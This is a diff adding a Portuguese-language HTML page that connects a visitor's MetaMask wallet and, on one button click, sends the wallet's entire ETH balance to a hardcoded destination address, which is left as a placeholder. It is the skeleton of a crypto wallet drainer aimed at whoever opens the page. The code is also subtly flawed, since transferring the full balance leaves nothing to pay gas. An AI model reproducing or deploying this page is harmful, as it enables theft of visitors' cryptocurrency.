@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Conectar MetaMask e Transferir</title>
+</head>
+<body>
+    <h1>Conectar MetaMask e Transferir</h1>
+    <button id="connectButton">Conectar MetaMask e Transferir</button>
+
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+    <script>
+        // Verificar se o MetaMask está instalado
+        if (typeof window.ethereum !== 'undefined') {
+            console.log('MetaMask está instalado!');
+            const ethereum = window.ethereum;
+
+            // Adicionar um evento de clique ao botão
+            document.getElementById('connectButton').addEventListener('click', async () => {
+                try {
+                    // Solicitar acesso à conta do usuário
+                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                    console.log('Conta conectada:', accounts[0]);
+
+                    // Criar uma instância do Web3
+                    const web3 = new Web3(ethereum);
+
+                    // Definir o endereço da carteira de destino
+                    const enderecoDestino = 'endereço_da_carteira_destino';
+
+                    // Verificar o saldo da conta MetaMask
+                    const saldo = await web3.eth.getBalance(accounts[0]);
+                    console.log('Saldo da conta MetaMask:', web3.utils.fromWei(saldo, 'ether'), 'ETH');
+
+                    // Construir e enviar a transação
+                    const valorTransferencia = saldo;
+                    const txObj = {
+                        from: accounts[0],
+                        to: enderecoDestino,
+                        value: valorTransferencia,
+                    };
+
+                    const receipt = await web3.eth.sendTransaction(txObj);
+                    console.log('Transação enviada. Detalhes:', receipt);
+                } catch (error) {
+                    console.error('Erro ao conectar MetaMask ou transferir saldo:', error);
+                }
+            });
+        } else {
+            console.log('Por favor, instale o MetaMask!');
+        }
+    </script>
+</body>
+</html>
